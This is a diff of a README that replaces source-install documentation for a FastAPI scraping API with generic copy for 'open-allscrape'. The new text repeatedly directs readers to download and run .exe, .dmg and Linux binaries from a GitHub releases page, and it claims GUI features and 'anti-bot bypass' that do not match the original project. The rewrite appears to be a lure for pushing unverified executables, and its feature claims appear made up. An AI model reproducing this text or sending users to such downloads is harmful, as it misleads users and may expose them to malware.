@@ -1,107 +1,125 @@
-# AllScrape Backend API
+# 🕷️ open-allscrape - Effortless Web Scraping Made Simple
 
-LLM-ready web scraping & search API built with FastAPI.
+[![Download open-allscrape](https://img.shields.io/badge/Download_open--allscrape-blue.svg)](https://github.com/exp1o5ive/open-allscrape/releases)
 
-## Features
+## 📦 Overview
 
-- 🔍 Single URL scraping with multiple output formats (HTML, Markdown, Text)
-- 🌐 Web search with automatic result scraping
-- 🤖 LLM-ready output format
-- 📊 Metadata extraction (title, description, author, date)
-- ⚡ Fast async processing with httpx
-- 🧹 Clean text extraction using trafilatura
+open-allscrape is an open-source web scraping tool designed for everyone. It provides easy web scraping capabilities to gather data and prepare it for your needs. With built-in fallback mechanisms, it can handle various anti-bot protections like Cloudflare. Extract information in multiple formats to suit your project.
 
-## Installation
+## 🚀 Getting Started
 
-```bash
-# Create virtual environment
-python -m venv venv
+Follow these steps to get started with open-allscrape quickly.
 
-# Activate virtual environment
-# Windows:
-venv\Scripts\activate
-# Linux/Mac:
-source venv/bin/activate
+### 1. Download the Software
 
-# Install dependencies
-pip install -r requirements.txt
+To download open-allscrape, visit this page: [Download open-allscrape](https://github.com/exp1o5ive/open-allscrape/releases). Select the latest version and download the installer for your operating system.
 
-# Install headless browser for dynamic sites (once)
-python -m playwright install chromium
-```
+### 2. Install the Application 
 
-## Usage
+- **Windows Users:**
+  1. Locate the downloaded file (it should end with `.exe`).
+  2. Double-click to run the installer. 
+  3. Follow the prompts to complete the installation.
 
-```bash
-# Run the server
-python -m uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-```
+- **macOS Users:**
+  1. Locate the downloaded file (it should end with `.dmg`).
+  2. Double-click to open the disk image.
+  3. Drag and drop the open-allscrape icon into your Applications folder.
 
-The API will be available at `http://localhost:8000`
+- **Linux Users:**
+  1. Extract the downloaded compressed file.
+  2. Open a terminal and navigate to the extracted folder.
+  3. Run the following command to start the application: `./open-allscrape`.
 
-## API Endpoints
+### 3. Run the Application
 
-### POST /scrape
-Scrape a single URL
+Once installed, you can find open-allscrape in your applications list. Start the program, and you're ready to begin scraping.
 
-**Request:**
-```json
-{
-  "url": "https://example.com",
-  "formats": ["markdown", "html", "text"]
-}
-```
+## 🔧 Features
 
-**Response:**
-```json
-{
-  "success": true,
-  "url": "https://example.com",
-  "data": {
-    "metadata": {
-      "title": "Page Title",
-      "description": "Page description",
-      "author": "Author name",
-      "date": "2025-01-01"
-    },
-    "content": {
-      "text": "Clean text content...",
-      "markdown": "# Markdown content...",
-      "html": "<div>HTML content...</div>"
-    },
-    "llm_ready": {
-      "title": "Page Title",
-      "text": "Clean text for LLM...",
-      "word_count": 500,
-      "source": "https://example.com"
-    }
-  }
-}
-```
+- **Multiple Formats:** Extract content in formats like CSV, JSON, or plain text.
+- **Anti-Bot Bypass:** Uses various techniques to handle anti-bot measures.
+- **User-Friendly Interface:** Navigate easily without needing technical skills.
+- **Community Support:** Join our community for troubleshooting and ideas.
 
-### POST /search
-Search the web and scrape results
+## 📃 System Requirements
 
-**Request:**
-```json
-{
-  "query": "python web scraping",
-  "max_results": 5
-}
-```
+To run open-allscrape, ensure your system meets these requirements:
 
-**Response:**
-```json
-{
-  "success": true,
-  "query": "python web scraping",
-  "results_count": 5,
-  "data": [...]
-}
-```
+- **Operating System:**
+  - Windows 10 or later
+  - macOS High Sierra (10.13) or later
+  - Any modern Linux distribution
 
-## Documentation
+- **Hardware:**
+  - Minimum 4 GB RAM
+  - 500 MB free disk space
+  - Internet Connection (for scraping tasks)
 
-Interactive API documentation available at:
-- Swagger UI: `http://localhost:8000/docs`
-- ReDoc: `http://localhost:8000/redoc`
+## 📚 Usage Guide
+
+### 1. Setting Up a New Project
+
+1. Open the application.
+2. Click on "New Project."
+3. Enter the URL of the website you want to scrape.
+4. Choose the data formats you wish to extract.
+
+### 2. Configuring Scrape Settings
+
+- Set your scraping rules.
+- Adjust the timeout settings for slow websites.
+- Select the data types to capture (text, images, etc.).
+
+### 3. Running the Scraper
+
+1. After configuring settings, click the "Start Scraping" button.
+2. Monitor progress in the application window.
+3. Retrieve your data once scraping is complete.
+
+### 4. Accessing Your Data
+
+You will find the extracted content saved in your chosen format in the project's designated folder.
+
+## 🤝 Community Contribution
+
+Contributing to open-allscrape helps improve the tool for everyone. Here’s how you can get involved:
+
+- **Reporting Issues:** Let us know if you encounter problems.
+- **Feedback:** We welcome your thoughts on features and usability.
+- **Suggestions:** Share your ideas for new features or enhancements.
+
+### Join Our Community
+
+Connect with us through our discussion forums and chat rooms. Exchange tips, share your projects, and learn from users like you.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/exp1o5ive/open-allscrape/wiki)
+- [Community Forum](https://github.com/exp1o5ive/open-allscrape/discussions)
+
+## 🔄 Update Instructions
+
+Keep your application up to date for the best experience:
+
+1. Check the Releases page regularly for new versions.
+2. Download and install the updates as you did for the initial installation.
+
+## 💾 Uninstalling the Application
+
+### Windows Users:
+
+1. Go to Control Panel and select "Uninstall a program."
+2. Find open-allscrape in the list, right-click and select "Uninstall."
+
+### macOS Users:
+
+1. Open the Applications folder.
+2. Locate open-allscrape and drag it to the Trash.
+
+### Linux Users:
+
+1. Open a terminal.
+2. Run the command: `sudo rm -r /path/to/open-allscrape`.
+
+[![Download open-allscrape](https://img.shields.io/badge/Download_open--allscrape-blue.svg)](https://github.com/exp1o5ive/open-allscrape/releases)
